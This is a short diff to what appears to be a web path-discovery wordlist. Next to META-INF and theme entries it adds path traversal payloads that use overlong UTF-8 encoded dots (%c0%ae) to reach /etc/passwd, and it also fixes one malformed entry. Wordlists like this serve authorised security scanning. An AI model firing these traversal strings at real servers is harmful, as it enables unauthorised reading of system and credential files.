@@ -3247,7 +3247,9 @@ MANIFEST
 MANIFEST.MF
 MANIFEST.bak
 META-INF
-META-INFcontext.xml
+META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+META-INF/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/etc/passwd
+META-INF/context.xml
 META.json
 META.yml
 MM
@@ -12639,6 +12641,9 @@ the_mattress_expert
 thecolonycourierleader/calendar/search
 theleader/calendar/search
 theme
+theme/META-INF
+theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+theme/META-INF/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/etc/passwd
 themes
 themesdefault/htdocs/flash/ZeroClipboard.swf
 thickbox
